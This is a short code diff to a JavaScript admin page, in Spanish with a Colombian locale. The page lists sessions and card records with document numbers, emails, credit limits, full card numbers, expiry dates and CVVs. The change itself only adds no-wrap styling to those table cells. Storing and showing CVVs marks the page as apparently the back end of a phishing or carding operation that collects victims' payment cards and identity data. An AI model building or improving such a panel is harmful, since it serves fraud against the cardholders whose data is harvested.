@@ -360,14 +360,14 @@ function renderSesiones() {
             <tr>
                 <td>${escapeHtml(fecha)}</td>
                 <td>${escapeHtml(nombre.trim() || '-')}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(doc)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(doc)}</td>
                 <td>${escapeHtml(correo)}</td>
                 <td>${escapeHtml(cupo)}</td>
                 <td>${escapeHtml(pct)}</td>
                 <td>${escapeHtml(nuevo)}</td>
-                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px;">${escapeHtml(tarjeta)}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(venc)}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(cvv)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px; white-space: nowrap;">${escapeHtml(tarjeta)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(venc)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(cvv)}</td>
                 <td><span class="estado estado-${estado}">${estado}</span></td>
                 <td>${acciones}</td>
             </tr>
@@ -406,10 +406,10 @@ $('btnVerTarjetas').addEventListener('click', async () => {
             <tr>
                 <td>${new Date(t.fecha).toLocaleString('es-CO')}</td>
                 <td>${escapeHtml(t.nombre.trim())}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(t.documento)}</td>
-                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px;">${escapeHtml(t.tarjeta)}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
-                <td style="color: #ffffff !important; font-weight: bold;">${escapeHtml(t.cvv)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.documento)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px; white-space: nowrap;">${escapeHtml(t.tarjeta)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.cvv)}</td>
                 <td><span class="estado estado-${t.estado}">${t.estado}</span></td>
             </tr>
         `).join('');
